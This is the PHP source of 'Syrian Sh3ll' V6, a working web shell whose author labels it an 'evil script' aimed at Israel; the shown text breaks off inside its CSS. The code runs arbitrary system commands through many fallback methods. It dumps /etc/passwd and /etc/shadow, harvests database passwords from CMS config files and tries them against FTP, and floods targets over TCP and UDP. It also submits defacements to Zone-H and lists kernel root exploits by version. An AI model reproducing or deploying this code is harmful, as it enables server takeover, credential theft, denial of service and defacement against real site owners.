<?php
#  ____ _ _    __ _ _ _ _  _      __      _ _    _             
# /_ _ _|\ \  / /| |____ \| |    /  \    | |\ \  ||             
# (_ _    \ \/ / | |____||| |   / /\ \   | | \ \ ||                      
# \_ _ \   \  |  | |____/ | |  / /--\ \  | |  \ \||              
# __ _) |  |  |  | |  \ \ | | / /----\ \ | |   \ \|          
#|_ _ _/   |__|  |_|   \_\|_|/_/      \_\|_|    \_|    
#  _ _ _ _          _ _
# /_ _ _| |        | | |   [ ~~Syrian Sh3ll~~ ] is a php evil script , please use it against ISRAEL Only .  
# (___  | |__   ___| | |   Coded By :  EH << SyRiAn | 34G13  <~> sy34[at]msn[dot]com
# \___ \|  _ \ / _ \ | |   Note : I'm Proud to be ~~SyRiAn~~
# __ _)|| | | || __/ | |   Copyright (C) 2010 - ~~ syrian-shell.com ~~
#|_ _ _/|_| |_|\___|_|_|   Thanx : [ Allah ] [ HaniWT ] [ SyRiAn_SnIpEr ] [ SyRiAn_SpIdEr ] [ TNT Hacker ] .

$uselogin = 1;   // Make It 0 If you Want To Disable Auth
$user = '0b4sh';  // Username
$pass = '0b4sh';  // Password
$sh3llColor = '#990000'; // sh3ll Color
?>
<?php
if($_GET['id']== 'logout')
{Logout();}
if(!($_GET['id'] == 'sshSession'))
{echo CSS($sh3llColor);}
# ---------------------------------------#
#                SuiCide                 #
#----------------------------------------#
else if($_GET['id'] == 100){echo "<body onload='Suicide();'>";}
else if($_GET['id'] == 'Delete'){Suicide();}
# ---------------------------------------#
#                Functions               #
#----------------------------------------#
function DeleteFile($fileName)
{
	global $os;
	if(function_exists('unlink'))
	{$delete = unlink($fileName);}
	if((!$delete) && ($os == 'Windows'))
	{$delete = Exe("del $fileName"); }
	else if((!$delete) && ($os == 'Linux'))
	{$delete = Exe("rm -f $fileName");}
	if($delete){return true;}else{return false;}
}
function DeleteFolder($folderName)
{
	global $os;
	if(function_exists('rmdir'))
	{$delete = rmdir($folderName);}
	if((!$delete) && ($os == 'Windows'))
	{$delete = Exe("rmdir $folderName"); }
	else if((!$delete) && ($os == 'Linux'))
	{$delete = Exe("rm -r $folderName");}
	if($delete){return true;}else{return false;}
}
function CopyFile($fileName,$newFileName)
{
	global $os;
	if(function_exists('copy'))
	{$copy = copy($fileName,$newFileName);}
	else if((!$copy) && ($os == 'Windows'))
	{$path = 'copy '.$fileName.' '.$newFileName; $copy = Exe($path);}
	else if((!$copy) && ($os == 'Linux'))
	{$path = 'copy '.$fileName.' '.$newFileName; $copy = Exe($path);}
	if($copy) {return true;}else{return false;}	
}
function RenameFile($fileName,$newFileName)
{
	global $os;
	if(function_exists('rename')){$rename = rename($fileName,$newFileName);}
	if((!$rename) && ($os == 'Linux'))
	{$path = 'mv '.$fileName.' '.$newFileName;$rename = Exe($path);}
	else if((!$rename) && ($os == 'Windows'))
	{$path = 'ren '.$fileName.' '.$newFileName;$rename = Exe($path);}
	if($rename) {return true;}else{return false;}	
}
function ChangeMode($file,$per)
{
	global $os;
	if(function_exists('chmod')){$chmod = chmod($file,$per);	}
	if((!$chmod) && ($os == 'Linux')){$chmod = Exe("chmod $per $file");}
	if($chmod){return true;}
	else{return false;}
}
function ChangeOwn($file,$newOwner)
{
	global $os;
	if(function_exists('chown')){$chown = chown($file,$newOwner);	}
	if((!$chown) && ($os == 'Linux')){$chown = Exe("chown $file $newOwner");}
	if($chown){return true;}
	else{return false;}
}
function ChangeGrp($file,$newGrp)
{
	global $os;
	if(function_exists('chgrp')){$chgrp = chgrp($file,$newGrp);	}
	if((!$chgrp) && ($os == 'Linux')){$chgrp = Exe("chgrp $file $newGrp");}
	if($chgrp){return true;}
	else{return false;}
}
function showUsers()
{
	if($rows = Exe('cat /etc/passwd')){echo $rows;}
	elseif($rows= Exe('cat /etc/domainalias')){echo $rows;}
	elseif($rows= Exe('cat /etc/shadow')){echo $rows;}
	elseif($rows= Exe('cat /var/mail')) {echo $rows;}
	elseif($rows= Exe('cat /etc/valiases')) {echo $rows;}
	elseif(file_exists('/etc/passwd'))
	{
		for($uid=0;$uid<60000;$uid++)
		{ 
			$ara = posix_getpwuid($uid);
			if (!empty($ara)) {while (list ($key, $val) = each($ara)){print "$val:";}print "\n";}
		}
		return true;
	}
	else { return false;}
}
function DDOSTcp($url)
{
	while(1)
	{
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$do = curl_exec($ch);
		curl_close($ch); 
		flush();
	}
return true;
}
function DDOSUdp($url)
{
    $packets = 0;
    ignore_user_abort(TRUE);
    set_time_limit(0);
    for($i=0;$i<65000;$i++){$out .= 'X'; }
    while(1)
	{
    		$packets++;
            $rand = rand(1,65000);
            $fp = fsockopen('udp://'.$url, $rand, $errno, $errstr, 5);
            if($fp){fwrite($fp, $out); fclose($fp);}
    } echo "UDP Flood : Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging\n";
}
function scanDirs()
{
	global $os; global $safe_mode;
	if($os == "Linux"){$scanDirs = Exe('ls -lia');}
	elseif ($os == "Windows"){$scanDirs = Exe('dir');}
	elseif(function_exists('opendir') && !$scanDirs)
	{
		if ($handle = opendir(getcwd())) 
		{
			while (false !== ($file = readdir($handle))){echo "$file\n";}
			while ($file = readdir($handle)){echo "$file\n";}
			closedir($handle);
		}
		$d=dir(getcwd());
	}
}
function getFiles($fileURL)
{
	$fileName = substr($fileURL,strrpos($fileURL,'/')+1);
	if(function_exists('file_get_contents') && function_exists('fwrite'))
	{
		$getTheFile = file_get_contents($fileURL);
		$getFile = GenerateFile($fileName,$getTheFile);
	}
	if(!$getFile){$getFile = Exe('get '.$fileURL);}
	else if(!$getFile){$getFile = Exe('wget '.$fileURL);}
	elseif(!$getFile){$getFile = Exe('curl -o '.$fileURL);}
	elseif(!$getFile){$getFile = Exe('lynx -source '.$fileURL);}
	if($getFile){return true;}else{return false;}
}
function ReadingFiles($file)
{
	$openMyFile = fopen($file,'r'); //Open The File
	if(function_exists('fread')){echo fread($openMyFile,100000);	} // Fread()
	elseif(function_exists('fgets')){echo fgets($openMyFile);} // fgets()
	elseif(function_exists('readfile')){echo readfile($openMyFile);} // readfile()
	elseif(function_exists('file_get_contents'))
	{$readMyFile = file_get_contents($file, NULL, NULL, 0, 1000000);var_dump($readMyFile);} // file_get_contents()
	else if(!is_dir(dirname(__FILE__)."/http:")) // curl Using file:HTTP
	{
		if(!is_writable(dirname(__FILE__))) echo "I can't create http:directory";
		else
		{
			mkdir("http:");
			if(get_magic_quotes_gpc() == 1){$file = stripslashes($_POST['file']);}
			else{$file=$_POST['file'];}
			if((curl_exec(curl_init("file:http://../".htmlspecialchars_decode($file))))  and !empty($file))  die();
			elseif(!empty($file)) die("Sorry... File ".htmlspecialchars($file)." doesn't exists or you don't have permissions.");	
		}
	}
	elseif(function_exists('file')) // file
	{
		$readMyFile = file($file); 
		foreach ($readMyFile as $line_num => $readMyFileLine) 
		{ echo $readMyFileLine . "
"; 
}
	}
	elseif(function_exists('copy')) // copy
	{
		$tmp=tempnam('','cx');
		copy('compress.zlib://'.$file,$tmp);
		$fh=fopen($tmp,'r');
		$data=fread($fh,filesize($tmp));
		fclose($fh);
		echo $data;
	}
	elseif(function_exists('mb_send_mail')) // mb_send_mail
	{
		if(file_exists('/tmp/mb_send_mail')){DeleteFile('/tmp/mb_send_mail');}
		mb_send_mail(NULL, NULL, NULL, NULL,'-C $file -X /tmp/mb_send_mail');
		readfile('/tmp/mb_send_mail');
	}
	else if(function_exists('curl_init')) // curl_init
	{
		$ch = curl_init("file://".$file."\x00".__FILE__);
		var_dump(curl_exec($ch));
	} 
	else if(is_object($ws=new COM('WScript.shell'))){echo $exec=comshell("type '$file'",$ws);} // WScript.shell
	else if(function_exists('win_shell_execute')){echo winshell("type '$file'");} // win_shell_execute
	else if(function_exists('win32_create_service')){echo srvshell("type '$file'");} // win32_create_service
	else if(function_exists('imap_open') && ($file == '/etc/passwd')) // imap_open
	{
		$str=imap_open('/etc/passwd','','');
		$list=imap_list($str,$file,'*');
		for($i=0;$i<count($list);$i++){echo $list[$i]."\n";}
		imap_close($str);
		$str=imap_open($file,'','');
		$tmp=imap_body($str,1);
		echo $tmp;
		imap_close($str);
	}
	elseif(function_exists('tempnam')) // tempnam
	{
		$tymczas="./";
		$temp=tempnam($tymczas, "cx");
		if(copy("compress.zlib://".$file, $temp))
		{
			$zrodlo = fopen($temp, "r");
			$tekst = fread($zrodlo, filesize($temp));
			fclose($zrodlo);
			echo htmlspecialchars($tekst);
			DeleteFile($temp);
		} 
		else {echo htmlspecialchars($file)."dosen't exists or you don't have access.";}
	}
	elseif(substr(phpversion(),0,1) <'5'){echo "Please Generate ini.php file and use ?cmd=command";}
	elseif(Exe('cat '.$file.'')){echo Exe('cat '.$file.'');	}
	elseif(function_exists('include')){include($file);	}
	fclose($openMyFile);	
}
function slashBypass($cmd)
{
	GenerateFile("cmd.bat","$cmd>sy3.txt"."\r\n exit");
	exec("\start cmd.bat");
	ReadingFiles('sy3.txt');
}
function DBConnect($host,$user,$pass,$db)
{
	$connect = mysql_pconnect($host,$user,$pass);
	if(!$connect){echo "Can't Connect to [ ".$host." ] [ ".$user." ] [ ".$pass." ]"; return false;	}
	else
	{
		$tryToSelectDB = mysql_select_db($db,$connect);
		if(!$tryToSelectDB){echo "Can't Enter The Database [ ".$db." ]"; return false;		}
		else{return true; return $connect;}
	}
}
function ViewDirectories($file)
{
	$con=glob("$file*");
	foreach ($con as $v){echo "$v\n";}
	if(function_exists('imap_open'))
	{
		$str=imap_open('/etc/passwd','','');
		$s=explode("|",$file);
		if(count($s)>1){$list=imap_list($str,trim($s[0]),trim($s[1]));}
		else {$list=imap_list($str,trim($str[0]),'*');}
		for($i=0;$i<count($list);$i++){imap_close($str);}
	}
	else if(is_object($ws=new COM('WScript.shell')))
	{
		$exec=comshell("dir '$file'",$ws);
		$exec=str_replace("\t",'',$exec);
		echo $exec;
	}
	else if(checkfunctioN('win_shell_execute')){echo winshell("dir '$file'");}
	else if(checkfunctioN('win32_create_service')){echo srvshell("dir '$file'");}
}
function getTheUser($domainToHack)
{
	$domainUser = Exe("ls -la /etc/valiases/$domainToHack");
	$counter =0 ; 
	for($i=0;$i<strlen($domainUser);$i++)
	{
		if($counter >= 4){break;}
		if($domainUser[$i] == ' '){$counter++;}
		if($counter == 3){if($domainUser[$i] == " "){}else {$domainUserName .= $domainUser[$i];}}
	}return $domainUserName;	
}
function ftp_check_config($login,$pass) 
{ 
	$ftp=ftp_connect('127.0.0.1'); 
	if ($ftp) 
	{ 
	   $res=ftp_login($ftp,$login,$pass); 
	   if ($res) { echo '[FTP] '.$login.':'.$pass."  Success\n"; } 
	   else ftp_quit($ftp); 
	} 
} 
function read_dir($path,$username) 
{ 
	if ($handle = opendir($path)) 
	{ 
	   while (false !== ($file = readdir($handle))) 
	   { 
			 $fpath="$path$file"; 
			 if (($file!='.') and ($file!='..')) 
			 { 
				if (is_readable($fpath)) 
				{ 
				   $dr="$fpath/"; 
				   if (is_dir($dr)) { read_dir($dr,$username); } 
				   else 
				   { 
						if (($file=='config.php') or ($file=='config.inc.php') or ($file=='db.inc.php') or ($file=='connect.php') or ($file=='wp-config.php') or ($file=='var.php') or ($file=='configure.php') or ($file=='db.php') or ($file=='db_connect.php')) 
						{ 
						   $pass=get_pass($fpath); 
						   if ($pass!='') 
						   { 
							   echo "[+] $fpath\n$pass\n"; 
							   ftp_check_config($username,$pass); 
						   } 
						} 
				   } 
				} 
			 } 
	   } 
	} 
} 
function get_pass($link) 
{ 
	$config=fopen($link,'r'); 
	while(!feof($config)) 
	{ 
	   $line=fgets($config); 
	   if (strstr($line,'pass') or strstr($line,'password') or strstr($line,'passwd')) 
	   { 
		   if (strrpos($line,'"')) 
		      $pass=substr($line,(strpos($line,'=')+3),(strrpos($line,'"')-(strpos($line,'=')+3))); 
		   else 
			  $pass=substr($line,(strpos($line,'=')+3),(strrpos($line,"'")-(strpos($line,'=')+3))); 
		   return $pass; 
	   } 
	} 
} 
function GetRealIP()
{
    if (getenv(HTTP_X_FORWARDED_FOR)){$ip=getenv(HTTP_X_FORWARDED_FOR);} 
	elseif (getenv(HTTP_CLIENT_IP)){$ip=getenv(HTTP_CLIENT_IP);}
	else {$ip=getenv(REMOTE_ADDR);}
    return $ip;
}
function openBaseDir()
{
	$openBaseDir = ini_get("open_basedir");
	if (!$openBaseDir){$openBaseDir = '<font color="green">OFF</font>';}
    else {$openBaseDir = '<font color="red">ON</font>';}	
	return $openBaseDir;
}
function str_hex($string)
{
	$hex='';
	for ($i=0; $i < strlen($string); $i++){$hex .= dechex(ord($string[$i]));}return $hex;
}
function SafeMode()
{
	$safe_mode = ini_get("safe_mode");
	if (!$safe_mode){$safe_mode = '<font color="green">OFF</font>';}
    else {$safe_mode = '<font color="red">ON</font>';}
	return $safe_mode;
}
function currentFileName()
{
	$currentFileName = $_SERVER["SCRIPT_NAME"];
	$currentFileName = Explode('/', $currentFileName);
	$currentFileName = $currentFileName[count($currentFileName) - 1];
	return $currentFileName;
}
function Suicide()
{DeleteFile(currentFileName());}
function rootxpL()
{
	$v=php_uname();
	$db=array('2.6.17'=>'prctl3, raptor_prctl, py2','2.6.16'=>'raptor_prctl, exp.sh, raptor, raptor2, h00lyshit','2.6.15'=>'py2, exp.sh, raptor, raptor2, h00lyshit','2.6.14'=>'raptor, raptor2, h00lyshit','2.6.13'=>'kdump, local26, py2, raptor_prctl, exp.sh, prctl3, h00lyshit','2.6.12'=>'h00lyshit','2.6.11'=>'krad3, krad, h00lyshit','2.6.10'=>'h00lyshit, stackgrow2, uselib24, exp.sh, krad, krad2','2.6.9'=>'exp.sh, krad3, py2, prctl3, h00lyshit','2.6.8'=>'h00lyshit, krad, krad2','2.6.7'=>'h00lyshit, krad, krad2','2.6.6'=>'h00lyshit, krad, krad2','2.6.2'=>'h00lyshit, krad, mremap_pte','2.6.'=>'prctl, kmdx, newsmp, pwned, ptrace_kmod, ong_bak','2.4.29'=>'elflbl, expand_stack, stackgrow2, uselib24, smpracer','2.4.27'=>'elfdump, uselib24','2.4.25'=>'uselib24','2.4.24'=>'mremap_pte, loko, uselib24','2.4.23'=>'mremap_pte, loko, uselib24','2.4.22'=>'loginx, brk, km2, loko, ptrace, uselib24, brk2, ptrace-kmod','2.4.21'=>'w00t, brk, uselib24, loginx, brk2, ptrace-kmod','2.4.20'=>'mremap_pte, w00t, brk, ave, uselib24, loginx, ptrace-kmod, ptrace, kmod','2.4.19'=>'newlocal, w00t, ave, uselib24, loginx, kmod','2.4.18'=>'km2, w00t, uselib24, loginx, kmod','2.4.17'=>'newlocal, w00t, uselib24, loginx, kmod','2.4.16'=>'w00t, uselib24, loginx','2.4.10'=>'w00t, brk, uselib24, loginx','2.4.9'=>'ptrace24, uselib24','2.4.'=>'kmdx, remap, pwned, ptrace_kmod, ong_bak','2.2.25'=>'mremap_pte','2.2.24'=>'ptrace','2.2.'=>'rip, ptrace');
	foreach($db as $k=>$x)if(strstr($v,$k))return $x;
	if(!$xpl)$xpl='<font color="red">Not found.</font>';
	return $xpl;
}
function PostgreSQL()
{
	if(function_exists('pg_connect')){$postgreSQL = '<font color="red">ON</font>';}
	else {$postgreSQL = '<font color="green">OFF</font>';}return $postgreSQL;
}
function Oracle()
{
	if(function_exists('ocilogon')){$oracle = '<font color="red">ON</font>';}
	else {$oracle = '<font color="green">OFF</font>';}return $oracle;
}
function ZoneH($url, $hacker, $hackmode,$reson, $site )
{
	$k = curl_init();
	curl_setopt($k, CURLOPT_URL, $url);
	curl_setopt($k,CURLOPT_POST,true);
	curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);
	curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
	$kubra = curl_exec($k);
	curl_close($k);return $kubra;
}
function MsSQL()
{
	if(function_exists('mssql_connect')){$msSQL = '<font color="red">ON</font>';}
	else {$msSQL = '<font color="green">OFF</font>';}return $msSQL;
}
function MySQL2()
{
	$mysql_try = function_exists('mysql_connect');
	if($mysql_try){$mysql = '<font color="red">ON</font>';}
	else {$mysql = '<font color="green">OFF</font>';}return $mysql;
}
function getConfigPath($ScriptType)
{
	if($ScriptType == 'vb'){return "/includes/config.php";}
	elseif($ScriptType == 'wp'){return "/wp-config.php";}
	elseif($ScriptType == 'phpbb'){return "/config.php";}
	elseif($ScriptType == 'jos'){return "/configuration.php";}
	elseif($ScriptType == 'ipb'){return "/conf_global.php";}
	elseif($ScriptType == 'smf'){return "/Settings.php ";}
	elseif($ScriptType == 'mybb'){return "/inc/config.php ";}
}
function Gzip()
{
	if (function_exists('gzencode')){$gzip = '<font color="red">ON</font>';}
	else {$gzip = '<font color="green">OFF</font>';}return $gzip;
}
function MysqlI()
{
	if (function_exists('mysqli_connect')){$mysqli = '<font color="red">ON</font>';}
	else {$mysqli = '<font color="green">OFF</font>';}return $mysqli;
} 
function MSQL()
{
	if (function_exists('msql_connect')){$mSql = '<font color="red">ON</font>';}
	else {$mSql = '<font color="green">OFF</font>';}return $mSql;
}
function SQlLite()
{
	if (function_exists('sqlite_open')){$SQlLite = '<font color="red">ON</font>';}
	else {$SQlLite = '<font color="green">OFF</font>';}return $SQlLite;
}
function RegisterGlobals()
{
	if(ini_get('register_globals')){$registerg= '<font color="red">ON</font>';}
	else{$registerg= '<font color="green">OFF</font>';}return $registerg;
}
function HardSize($size)
{
	if($size >= 1073741824) {$size = round($size / 1073741824 * 100) / 100 . " GB";}
	elseif($size >= 1048576) {$size = round($size / 1048576 * 100) / 100 . " MB";}
	elseif($size >= 1024) {$size = round($size / 1024 * 100) / 100 . " KB";}
	else {$size = $size . " B";}return $size;
}
function Curl()
{
	if(extension_loaded('curl')){$curl = '<font color="red">ON</font>';}
	else{$curl = '<font color="green">OFF</font>';}return $curl;
}
function getConfigInfo($scriptType)
{
	if(file_exists('DecryptConfig.php'))
	{
		include("DecryptConfig.php");
	
	if($scriptType == 'vb')
	{
		$dbName = $config['Database']['dbname'];
		$prefix = $config['Database']['tableprefix'];
		$email = $config['Database']['technicalemail'];
		$host = $config['MasterServer']['servername'];
		$port = $config['MasterServer']['port'];
		$user = $config['MasterServer']['username'];
		$pass = $config['MasterServer']['password'];
		$admincp = $config['Misc']['admincpdir'];
		$modecp = $config['Misc']['modcpdir'];
	}
	elseif($scriptType == 'wp')
	{
		$dbName = DB_NAME;
		$prefix = $table_prefix;
		$host = DB_HOST;
		$user = DB_USER;
		$pass = DB_PASS;
	}	
	elseif($scriptType == 'jos')
	{
		$dbName = $db;
		$prefix = $dbprefix;
		$email = $mailfrom;
		$host = $host;
		$user = $user;
		$pass = $password;
	}
	elseif($scriptType == 'phpbb')
	{
		$host = $dbhost;
		$port = $dbport;
		$dbName = $dbname;
		$user = $dbuser;
		$pass = $dbpasswd;
		$prefix = $table_prefix;
	}
	elseif($scriptType == 'ipb')
	{
		$host = $INFO['sql_host'];
		$dbName = $INFO['sql_database'];
		$user = $INFO['sql_user'];
		$pass = $INFO['sql_pass'];
		$prefix = $INFO['sql_tbl_prefix'];
	}
	elseif($scriptType == 'smf')
	{
		$dbName = $db_name;
		$pass = $db_passwd;
		$prefix = $db_prefix;
		$host = $db_server;
		$user = $db_user;
		$email = $webmaster_email;
	}
	elseif($scriptType == 'mybb')
	{
		$host = $config['database']['hostname'];
		$user = $config['database']['username'];
		$pass = $config['database']['password'];
		$dbName = $config['database']['database'];
		$prefix = $config['database']['table_prefix'];
		$admincp = $config['admin_dir'];
		$prefix = $config['database']['table_prefix'];
	}
	echo '
#-------------------------------#
#      Config Informations      #
#-------------------------------#
Host : '.$host.'
DB Name : '.$dbName.'
DB User : '.$user.'
DB Pass : '.$pass.'
Prefix : '.$prefix.'
Email : '.$email.'
Port : '.$port.'
ACP : '.$admincp.'
MCP : '.$modecp.'
';
	}
	else{echo "File DecryptConfig.php Not Exists !! ";}
}
function footer()
{
	echo '<table bgcolor="#cccccc" width="100%"><tr>
	<td width="100%">[<sy><a href="#top">TOP</a></sy>]
	<center><font color="gray" size="-2"><b>
	<font color="gray">C0D3D By</font><sy>&nbsp; ~~ [ </sy>
	<font color="gray">EH SyRiAn_34G13</font><sy> ] ~~ [
	</sy><font color="gray">sy34@msn.com</font><sy> ]
	~~ [
	</sy><font color="gray">SyRiAn Cyb3r Army</font><sy> ]
	</sy></b>
	</td>
	</tr></table>
	</tbody>
	<a name="down"></a>
	</body></html>
	';
}
function whereistmP()
{
	$uploadtmp=ini_get('upload_tmp_dir');
	$uf=getenv('USERPROFILE');
	$af=getenv('ALLUSERSPROFILE');
	$se=ini_get('session.save_path');
	$envtmp=(getenv('TMP'))?getenv('TMP'):getenv('TEMP');
	if(is_dir('/tmp') && is_writable('/tmp'))return '/tmp';
	if(is_dir('/usr/tmp') && is_writable('/usr/tmp'))return '/usr/tmp';
	if(is_dir('/var/tmp') && is_writable('/var/tmp'))return '/var/tmp';
	if(is_dir($uf) && is_writable($uf))return $uf;
	if(is_dir($af) && is_writable($af))return $af;
	if(is_dir($se) && is_writable($se))return $se;
	if(is_dir($uploadtmp) && is_writable($uploadtmp))return $uploadtmp;
	if(is_dir($envtmp) && is_writable($envtmp))return $envtmp;
	return '.';
}
function winshell($command)
{
	$name=whereistmP()."\\".uniqid('NJ');
	win_shell_execute('cmd.exe','',"/C $command >\"$name\"");
	sleep(1);
	$exec=file_get_contents($name);
	DeleteFile($name);
	return $exec;
}
function update()
{echo "[+] Update Has D0n3 ^_^";}
function srvshell($command)
{
	$name=whereistmP()."\\".uniqid('NJ');
	$n=uniqid('NJ');
	$cmd=(empty($_SERVER['ComSpec']))?'d:\\windows\\system32\\cmd.exe':$_SERVER['ComSpec'];
	win32_create_service(array('service'=>$n,'display'=>$n,'path'=>$cmd,'params'=>"/c $command >\"$name\""));
	win32_start_service($n);
	win32_stop_service($n);
	win32_delete_service($n);
	while(!file_exists($name))sleep(1);
	$exec=file_get_contents($name);
	DeleteFile($name);
	return $exec;
}
function ffishell($command)
{
	$name=whereistmP()."\\".uniqid('NJ');
	$api=new ffi("[lib='kernel32.dll'] int WinExec(char *APP,int SW);");
	$res=$api->WinExec("cmd.exe /c $command >\"$name\"",0);
	while(!file_exists($name))sleep(1);
	$exec=file_get_contents($name);
	DeleteFile($name);
	return $exec;
}
function comshell($command,$ws)
{
	$exec=$ws->exec("cmd.exe /c $command"); 
	$so=$exec->StdOut();
	return $so->ReadAll();
}
function perlshell($command)
{
	$perl=new perl();
	ob_start();
	$perl->eval("system('".$command."')");
	$exec=ob_get_contents();
	ob_end_clean();
	return $exec;
}
function Exe($command)
{
	global $os;
	if(function_exists('passthru')){$exec = passthru($command);}
	elseif(function_exists('system') && !$exec){$exec= system($command); }
	elseif(function_exists('exec') && !$exec){exec($command,$output);$exec=join("\n",$output);}
	elseif(function_exists('shell_exec') && !$exec){$exec=shell_exec($command);}
	elseif(function_exists('popen') && !$exec){$fp = popen($command,"r");
	{while(!feof($fp)){$result.=fread($fp,1024);}pclose($fp);}$exec = convert_cyr_string($result,"d","w");}
	elseif(function_exists('win_shell_execute') && !$exec){$exec = winshell($command);}
	elseif(function_exists('win32_create_service') && !$exec){$exec=srvshell($command);}
	elseif(extension_loaded('ffi') && !$exec){$exec=ffishell($command);}
	elseif(extension_loaded('perl') && !$exec){$exec=perlshell($command);}
	elseif(!$exec) {$exec = slashBypass($command);}
	elseif(!$exec && extension_loaded('python'))
	{$exec = python_eval("import os
	pwd = os.getcwd()
	print pwd
	os.system('".$command."')");}
	elseif($exec){return $exec;}
}
function magicQouts()
{
	if(function_exists('get_magic_quotes_gpc')){$mag = get_magic_quotes_gpc();}
	if (empty($mag)){$mag = '<font color="green">OFF</font>';}
	else {$mag= '<font color="red">ON</font>';}return $mag;
}
function DisableFunctions()
{
	$disfun = ini_get('disable_functions');
	if (empty($disfun)){$disfun = '<font color="green">NONE</font>';}return $disfun;
}
function SelectCommand($os)
{
	if($os == 'Windows')
	{
		echo "
		<select name=alias >
		<option value=''>NONE</option>	
		<option value='dir' >List Directory</option>
		<option value='dir /s /w /b index.php'>Find index.php in current dir</option>
		<option value='dir /s /w /b *config*.php'>Find *config*.php in current dir &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  &nbsp;  &nbsp;  &nbsp;  &nbsp;  &nbsp;</option>
		<option value='netstat -an'>Show active connections</option>
		<option value='net start'>Show running services</option>
		<option value='tasklist'>Show Pro</option>
		<option value='net user'>User accounts</option>
		<option value='net view'>Show computers</option>
		<option value='arp -a'>ARP Table</option>
		<option value='ipconfig /all'>IP Configuration</option>
		<option value='netstat -an'>netstat -an</option>
		<option value='systeminfo'>System Informations</option>
		<option value='getmac'>Get Mac Address</option>
		</select>
		";
	}
	else
	{
		echo "
		<select name=alias >
		<option value=''>NONE</option>	
		<option value='ls -la'>List dir</option>
		<option value='cat /etc/hosts'>IP Addresses</option>
		<option value='cat /proc/sys/vm/mmap_min_addr'>Check MMAP</option>
		<option value='lsattr -va'>list file attributes on a Linux second extended file system</option>
		<option value='netstat -an | grep -i listen'>show opened ports</option>
		<option value='find / -type f -perm -04000 -ls'>find all suid files</option>
		<option value='find . -type f -perm -04000 -ls'>find suid files in current dir</option>
		<option value='find / -type f -perm -02000 -ls'>find all sgid files</option>
		<option value='find . -type f -perm -02000 -ls'>find sgid files in current dir</option>
		<option value='find / -type f -name config.inc.php'>find config.inc.php files</option>
		<option value='find / -type f -name \"config*\"'>find config* files</option>
		<option value='find . -type f -name \"config*\"'>find config* files in current dir</option>
		<option value='find / -perm -2 -ls'>find all writable folders and files</option>
		<option value='find . -perm -2 -ls'>find all writable folders and files in current dir</option>
		<option value='find / -type f -name service.pwd'>find all service.pwd files</option>
		<option value='find . -type f -name service.pwd'>find service.pwd files in current dir</option>
		<option value='find / -type f -name .htpasswd'>find all .htpasswd files</option>
		<option value='find . -type f -name .htpasswd'>find .htpasswd files in current dir</option>
		<option value='find / -type f -name .bash_history'>find all .bash_history files</option>
		<option value='find . -type f -name .bash_history'>find .bash_history files in current dir</option>
		<option value='find / -type f -name .fetchmailrc'>find all .fetchmailrc files</option>
		<option value='find . -type f -name .fetchmailrc'>find .fetchmailrc files in current dir</option>
		<option value='locate httpd.conf'>locate httpd.conf files</option>
		<option value='locate vhosts.conf'>locate vhosts.conf files</option>
		<option value='locate proftpd.conf'>locate proftpd.conf files</option>
		<option value='locate psybnc.conf'>locate psybnc.conf files</option>
		<option value='locate my.conf'>locate my.conf files</option>
		<option value='locate admin.php'>locate admin.php files</option>
		<option value='locate cfg.php'>locate cfg.php files</option>
		<option value='locate conf.php'>locate conf.php files</option>
		<option value='locate config.dat'>locate config.dat files</option>
		<option value='locate config.php'>locate config.php files</option>
		<option value='locate config.inc'>locate config.inc files</option>
		<option value='locate config.inc.php'>locate config.inc.php</option>
		<option value='locate config.default.php'>locate config.default.php files</option>
		<option value='locate config'>locate config* files </option>
		<option value='locate \'.conf\''>locate .conf files</option>
		<option value='locate \'.pwd\''>locate .pwd files</option>
		<option value='locate \'.sql\''>locate .sql files</option>
		<option value='locate \'.htpasswd\''>locate .htpasswd files</option>
		<option value='locate \'.bash_history\''>locate .bash_history files</option>
		<option value='locate \'.mysql_history\''>locate .mysql_history files</option>
		<option value='locate \'.fetchmailrc\''>locate .fetchmailrc files</option>
		<option value='locate backup'>locate backup files</option>
		<option value='locate dump'>locate dump files</option>
		<option value='locate priv'>locate priv files</option>
		</select>
		";
	}
}
function GenerateFile($name,$content)
{
	if(function_exists('fopen') && function_exists('fclose'))
	{
		$file = fopen($name,"w+");
		if($file)
		{
			if(function_exists('fwrite')){$writeFile = fwrite($file,$content); }	
			else if (function_exists('fputs')){$writeFile = fputs($file,$content); }
			else if (function_exists('file_put_contents')){$writeFile = file_put_contents($file,$content);}
			if(!$writeFile){return false;}
		}
		else{return false;}fclose($file);return true;
	}
}
function which($pr)
{ 
	$path = Exe("which $pr");
	if(!empty($path)) { return trim($path); } 
	else {return trim($pr);} 
}
function CSS($sh3llColor)
{
	$css =  "
	<html dir=rtl>
	<head>
	<title>SyRiAn Sh3ll ~ V6~ [ B3 Cr34T!V3 Or D!3 TRy!nG ]</title>
	<link rel=\"shortcut icon\" href='http://syrian-shell.com/title.gif' />
	<meta http-equiv=Content-Type content=text/html; charset=windows-1256>
	<style>
	BODY
	{
		FONT-FAMILY: Verdana; 
		margin: 2;
		color: #cccccc;
		background-color: #000000;
	}
	sy  
	{
		color:".$sh3llColor.";
		font-size:7pt;
		font-weight: bold;
	}
	#Box
	{
	color:".$sh3llColor.";
	font-size:14px;
	background-color:#000;
	font-weight:bold;
	}
	tr 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #ffffff;
	}
	td 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #cccccc;
	}
	.table1 
	{
	BORDER: 1px none;
	BACKGROUND-COLOR: #000000;
	color: #333333
	}
	.td1 
	{
	BORDER: 1px none;
	color: #ffffff; font-style:normal; 
	font-variant:normal;
	font-weight:normal;
	font-size:7pt;
	font-family:tahoma
	}
	.tr1 
	{
	BORDER: 1px none;
	color: #cccccc;
	}
	table 
	{
	BORDER:  #eeeeee  outset;
	BACKGROUND-COLOR: #000000;
	color: #cccccc;
	}
	input 
	{
